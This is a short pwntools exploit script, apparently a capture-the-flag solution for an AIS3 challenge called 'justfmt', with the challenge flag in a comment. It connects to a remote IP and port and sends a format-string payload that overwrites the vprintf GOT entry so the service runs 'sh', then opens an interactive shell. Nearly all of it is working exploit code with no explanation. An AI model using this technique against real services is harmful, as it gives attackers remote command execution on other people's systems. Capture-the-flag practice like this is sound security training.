#!/usr/bin/env python
from pwn import *

# AIS3{fMt_stR1n6_1s_H4rp_s0w3t1meS_dnt_1ts_fnu!!}

e , l = ELF( './justfmt-8a9c0d934ff6c2fe488a63cd5c5bf8fc3d30ff382f029f0e4f075dbafc3486b9' ) , ELF( './libc-2.19.so' )

host , port = '104.199.235.135' , 2113
y = remote( host , port )

context.arch = 'amd64'

p = 'sh;%25997c%11$hn'.ljust( 0x28 , '\x00' ) + p64( e.got['vprintf'] )

y.send( p )

y.interactive()